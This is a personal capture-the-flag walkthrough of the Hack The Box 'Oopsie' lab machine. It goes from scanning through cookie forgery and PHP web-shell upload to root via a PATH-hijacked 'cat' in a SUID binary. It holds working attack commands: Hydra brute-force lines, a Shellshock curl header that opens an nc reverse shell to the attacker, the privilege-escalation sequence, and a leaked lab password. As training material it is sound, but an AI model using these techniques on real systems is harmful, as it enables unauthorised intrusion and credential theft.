# Oopsie

This is the second box in the hackthebox.eu starting point zone.  All of the boxes in this zone are rated very easy, and we're doing them for informational purposes.  This one is our first Linux box.

Scroll to the end for [a very direct walk-through](#day-3-clean-walk-through) or follow along for the full story of my trials and tribulations :)

* [Oopsie](#oopsie)
	* [Day 1: Discovery](#day-1-discovery)
		* [Apache](#apache)
			* [Login Form](#login-form)
			* [Dirbuster](#dirbuster)
		* [Searching for CVEs](#searching-for-cves)
		* [Brute Force](#brute-force)
		* [Shell Shock](#shell-shock)
		* [End of Day 1](#end-of-day-1)
	* [Day 2](#day-2)
		* [The Login Form](#the-login-form)
		* [The admin portal](#the-admin-portal)
		* [Becoming Super Admin](#becoming-super-admin)
		* [Uploads Page](#uploads-page)
		* [Inside the Machine](#inside-the-machine)
		* [SSH access](#ssh-access)
		* [End of Day 2](#end-of-day-2)
	* [Day 3: Clean Walk Through](#day-3-clean-walk-through)
		* [Scanning](#scanning)
		* [The Web Server](#the-web-server)
			* [Dirbuster](#dirbuster-1)
			* [The Login Form](#the-login-form-1)
			* [The Admin Page](#the-admin-page)
		* [Foothold](#foothold)
		* [Privilege Escalation](#privilege-escalation)
			* [Getting Root](#getting-root)
				* [Exploiting The Bugtracker](#exploiting-the-bugtracker)
		* [Post Exploitation](#post-exploitation)

## Day 1: Discovery

Starting with a simple nmap scan:
```

└─$ sudo nmap -O -sV -sC -sS -v -oA nmap.out 10.10.10.28
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 18.759 days (since Sun Jul  4 23:42:22 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=252 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

We see that our target is running both ssh and a web server.  Immediately, my thoughts drift towards SQLi, shell-shock, password guessing, or maybe an exploit on that version of ssh or apache.  Let's try these in order...

### Apache

First, I'm going to open up Burp Suite and browse around the website for some passive spidering.  

Notes while browsing:
* The "Learn More" CTA is broken, maybe some JS issues?
* Their contact info is at the bottom of the site, I doub't that's relevant but good to capture
* The site looks pretty static, on first glance
* There's some interesting JS files being loaded
	* pen.js is referenced
	* /cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js is also referenced -- not sure what the cdn-cgi folder is all about but could be interesting 
		* looks like it's forbidden at the root layer, so maybe some insecure direct object reference with dirbuster could help here
	* http://10.10.10.28/cdn-cgi/login/script.js is also referenced
		* http://10.10.10.28/cdn-cgi/login/ shows a login form!!!

I feel pretty excited by the login form so I'm gonna pause here and explore it a bit more...

#### Login Form

Visiting http://10.10.10.28/cdn-cgi/login shows me a login page, and inspecting the html I see it's POSTing to /cdn-cgi/login/index.php

* First, I tried looking for a .zip, .bk, .bak, ~ (emacs), or .swp (vim) to see if I can read the index.php script but no such luck.  Navigating to it directly just shows me the form again, which tells me that index.php is probably the DefaultIndex for apache.

I'm gonna try sqlmap next.  Running with mostly defaults:

```
└─$ sqlmap http://10.10.10.28/cdn-cgi/login/index.php --forms --crawl=2 --text-only               
...

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:12:05 /2021-07-23/

do you want to check for the existence of site's sitemap(.xml) [y/N] 
[18:12:07] [INFO] starting crawler for target URL 'http://10.10.10.28/cdn-cgi/login/index.php'
[18:12:07] [INFO] searching for links with depth 1
[18:12:08] [INFO] searching for links with depth 2                                                                                                                                                                                          
please enter number of threads? [Enter for 1 (current)] 
[18:12:09] [WARNING] running in a single-thread mode. This could take a while
do you want to normalize crawling results [Y/n]                                                                                                                                                                                             
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] 
[#1] form:
POST http://10.10.10.28/cdn-cgi/login/index.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
...
[18:12:21] [WARNING] POST parameter 'username' does not seem to be injectable
[18:12:21] [INFO] testing if POST parameter 'password' is dynamic
[18:12:21] [WARNING] POST parameter 'password' does not appear to be dynamic
[18:12:21] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
...
[18:12:23] [WARNING] POST parameter 'password' does not seem to be injectable
[18:12:23] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next form
...
```

Bummer, no SQLi on this page, it seems.  I also ran an active scan with BurpSuite and it returned the same, so it's pretty likely this isn't an SQLi challenge.  Hmm, what else can we find...

After trying some manual enumeration on the login form, checking some response types, looking through some JS files, I'm not finding much and feeling a little discouraged.  Let's let dirbuster give it a shot

#### Dirbuster

Using mostly standard settings (I set things to "go faster" @ http://10.10.10.28 using /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt) I found a couple of interesting things:

* In addition to /cdn-cgi/login/index.php, there's also /cdn-cgi/login/admin.php and /cdn-cgi/login/db.php
	* However, neither of these seem too useful at the moment when I open them in the browser
* There's an uploads directory, but I didn't find anything in it at the moment

Nothing else horribly interesting, so let's stash these new php files for future reference and move on...

### Searching for CVEs

I did a quick `searchsploit apache 2.4` and `searchsploit OpenSSH 7.6`.  One interesting thing stands out:

```
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalat | linux/local/46676.php
```

That could come in handy later, but otherwise no RCEs immediately available.

There is a user enumeration vulnerability for openssh which could be handy, but it looks like it's just for python2 which is EOL and I can't seem to install paramiko at the moment.  Since it's just user enumberation I'm going to skip it for now and try Hydra on the login form ...

### Brute Force

Hydra is the go-to tool here.  I won't cover all the arguments, but these are the commands I ran:

```
# For the login form
└─$ sudo hydra -v -I -l admin -P /usr/share/wordlists/fasttrack.txt 10.10.10.28 http-post-form "/cdn-cgi/login/index.php:username=admin&password=^PASS^:Log in" -e nsr -f

# For the SSH server
$ hydra -I -l root -P /usr/share/wordlists/fasttrack.txt 10.10.10.28 ssh -t 4 -v -e nsr -f 
```

I could also use rockyou.txt but since we're going over a network, my request rate is really low and I don't want to wait... 2 or 3 months... for a result :P

TLDR; no luck with our (very limited) brute force.

### Shell Shock

A simple exploit to try which may or may not work is Shell Shock.  You can read about it online in various places, but basically it's an RCE that uses request headers and is quite trivial to exploit.

```
# First we start our server:
$ nc -nlvp 443

# Then we curl the remote server with our payload
$ curl -H "X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 10.10.14.47 443" 10.10.10.28/cdn-cgi/login/index.php
```

And it doesn't work... no connection back to our netcat server.

### End of Day 1

I'm at the end of my first attempt on this server.  Gonna walk away for a little while.

Next Steps:
1. Look deeper into the source of that website.  Play more with index.php/admin.php/db.php
2. Do a more complete nmap scan -- higher ports, UDP, more scripts
3. Try more domain / file URL enumeration with different suffixes, let it run overnight

I do suspect the php scripts.  Maybe there's evidence of a cookie I need to set or a password hanging out in the JS files or something.  The box is supposed to be "very easy" right, so maybe I'm missing something very simple :)

## Day 2

Today I started with some aggressive nmap scans, including http-* and ssh-* scripts, to no avail.  I went back through and tried to guess more files and fell short.  I re-visted the HTML code and found nothing new of interest.  I even re-visted `searchsploit` and while I found an SSL vulnerability I had previously overlooked, this site does not use SSL and so trying to decipher that assembler code and the memory addresses associated with that payload seems moot.

I once again turned my attention to the login form.

### The Login Form

For this, I had to peak around the internet.  Turns out, credentials from previous boxes are *re-used* within Starting Point!  This means that the admin password from Archetype works to log us into the portal.

This felt like both a huge victory, as well as a technicality that I felt justified taking a hint on.  In retrospect, password re-use is a very common problem and I should have thought of this.  I won't be fooled again!

### The admin portal

Now that we're logged in, we're at /cdn-cgi/login/admin.php and we see some new pages, as well as some interesting URL parameters.  

After trying some initial injections into the URL parameters without much luck (there's possibly some XSS but that's not what we're after here...) it becomes quite obvious the target is the uploads page which is for "super admins" only.

Some light enumeration of the ID fields on the various pages (i.e. http://10.10.10.28/cdn-cgi/login/admin.php?content=clients&orgId=1, orgId=2, etc) using Burp Intruder's "sniper" mode and a "Number" payload type yields pay-dirt on the account page.

http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=30 is a super admin!  And we have their user ID!

### Becoming Super Admin

Looking in our cookies, I see that there's a user-id and a role type.  For this, I simply modify the unsigned cookie.  I put in the user-id of the super-admin and I put in the role "super admin", and bam!  Uploads page is visible :)

### Uploads Page

Here we see they take a brand name (possibly an ID from the brands page?  Or a model number?  Maybe a price?  Maybe all three in a CSV?) and a file upload option.  

I imagine the file upload gets parsed into the respective fields, so perhaps this is an opportunity to inject some SQL and spit out a file somewhere on the server.  It might also be an opportunity to upload a shell directly.  Writing a PHP shell is trivial with exec() so I'm gonna do that and dump out some PHP info while I'm at it, and then try to upload the file...

Upload success.

Navigating to the file in the /uploads directory I found earlier with dirbuster reveals I have a simple webshell.  From here, I can spawn a netcat session back to my box to make it easier to poke around.

### Inside the Machine

Looking around, I see I can't access Robert's home folder or /root (obviously), so what can I see?  I remember the db.php file that dirbuster found earlier which showed nothing in the browser.  On the server, it contains DB credentials.  Looks like the user is robert, does the password work for ssh?

### SSH access

I try logging in with Robert via SSH and I'm successful!  I immediately grab the user flag from his home folder.  But how to get root?

I try "sudo su" and, to my surprise, it works.  I'm not sure if this was supposed to work, though, as the official writeup talks about a different path.  I'll try their approach tomorrow when I do a clean run through from start to finish and document the direct path.

### End of Day 2

I'm pretty happy because today I got the root flag and only used a simple hint from the writeup to know about the password re-use.  I looked at the writeup again after `sudo su` magically worked to see if I was missing something.

Today I used the following techniques to get a foothold and grab root creds:

* Password re-use
* Knowledge of the db.php and some basic PHP scripting experience
* Reverse shells
* Knowledge of the "sudo su" command to get a shell as root

Tomorrow, I'll do a clean approach where I:

1. re-scan the box with a simple nmap scan
2. re-dirbuster the site with a basic directory list
3. try to login to the form as admin with password re-use
4. find the super-user and upgrade my account
5. upload a reverse shell
6. grab the user flag
7. get root using the write-up approach of `id` -> `strings` -> malicious file -> shell
8. grab the root flag
9. review the "post exploitation" stuff mentioned in the official writeup

## Day 3: Clean Walk Through

Following the above list for practice before moving onto the next target.  We'll go from nada to root right quick.

### Scanning

A simple nmap scan tells us everything we need to know:

```
└─$ nmap 10.10.10.28              
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 13:56 EDT
Nmap scan report for 10.10.10.28
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```

A web server and SSH access.  

### The Web Server

http://10.10.10.28/ shows a very basic website without much going on.  Let's point dirbuster at it and see what we find.  

#### Dirbuster

Using the "go faster" setting and putting in the URL, I specify `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` as the wordlist and click start.  Right away it finds `/uploads` and `/cdn-cgi/login` -- uploads returns "Forbidden" but login returns a form.

#### The Login Form

Some basic brute forcing is an option, but since this is MegaCorp, let's try some of the passwords we already know.  From the previous box, we know the administrator's password, so we try it again.  It works!  We have an admin page.

#### The Admin Page

We see some URL params that look ripe for IDOR (Insecure Direct Object Reference) as well as an "uploads" page that requires super-admin access. 

Loading the accounts url into Burp with a number-based iterator and we quickly find out that the "super admin" is id=30, as well as their access code.

Plugging the access code into our cookie, which is not signed, gives us access to the uploads page.

### Foothold

For this, we're going to try uploading a php-reverse-shell from /usr/share/webshells/php -- we set it to our IP and the port we want, start the netcat server, upload the shell, and then trigger it via http://10.10.10.28/uploads/php-reverse-shell.php

Our netcat shell is established.  If yours doesn't work, check your firewall.

Grab the user.txt flag from Robert's home folder (which we can read) and let's continue on.

### Privilege Escalation

Looks like we can't run sudo right away (shame).  Let's take a look around for some credentials or an SSH key.  

Robert doesn't seem to have a history file, and he doesn't have an SSH key readily available.  However, one of the PHP scripts that dirbuster (db.php) found reveals Robert's password is `M3g4C0rpUs3r!` .

```
└─$ ssh robert@10.10.10.28                                                                                                                                                                                                             130 ⨯
robert@10.10.10.28's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)
...
```

#### Getting Root

Still looks like sudo is blocked:

```
robert@oopsie:~$ sudo su
[sudo] password for robert: 
robert is not in the sudoers file.  This incident will be reported.
```

So let's look for setui binaries which might allow us to slip into root:

```
$ find / -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename
```

Skipping over the system stuff, snap, stuff, and normal binaries we see that /usr/bin/bugtracker is present, runs as root, and can be run by users in the "bugtracker" group:

```
$ id
robert@oopsie:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Looks like that's us.

##### Exploiting The Bugtracker

First we run the binary:

```
   robert@oopsie:~$ /usr/bin/bugtracker
   
   - -----------------
   :  EV Bug Tracker :
   - -----------------
   
   Provide Bug ID: 1
   
   Binary package hint: ev-engine-lib
   
   Version: 3.3.3-1
   
   Reproduce:
   When loading library in firmware it seems to be crashed
   
   What you expected to happen:
   Synchronized browsing to be enabled since it is enabled for that site.
   
   What happened instead:
   Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
```

We see that it's outputting some text when we give it a number.  Let's see if we can reverse engineer it a bit to aid our exploitation.

We start by running `strings` on it

...
$ strings /usr/bin/bugtracker
   ...
   _ITM_registerTMCloneTable
   AWAVI
   AUATL
   [ ]A\A]A^A_
   :  EV Bug Tracker :
   Provide Bug ID: 
   cat /root/reports/   <---- here
   ;*3$"
   GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
   ...
```

We can see that it's using a relative call to the `cat` command. This means it's ripe for injecting a malicious binary into $PATH:

```
robert@oopsie:~$ cd /tmp
robert@oopsie:/tmp$ echo "/bin/sh" > cat
robert@oopsie:/tmp$ chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ bugtracker 
   
   - -----------------
   :  EV Bug Tracker :
   - -----------------
   
   Provide Bug ID: 1
   
   \# whoami
   root
```

Now we grab the root.txt flag from /root and submit it.

### Post Exploitation

Now that we know all the boxes are related, it's important to take a closer look around after we get root.  

Looking in the reports folder in the root directory, we see some bug reports talking about ".config/filezilla" -- sure enough, this file exists in the root directory.  This seems to talk about 10.10.10.48 which mig

We also had a "garage" database mentioned in db.php

Let's grab down all our loot and save it for later:

* /root/.config/filezilla/filezilla.xml
* /var/www/html/cdn-cgi/login/db.php

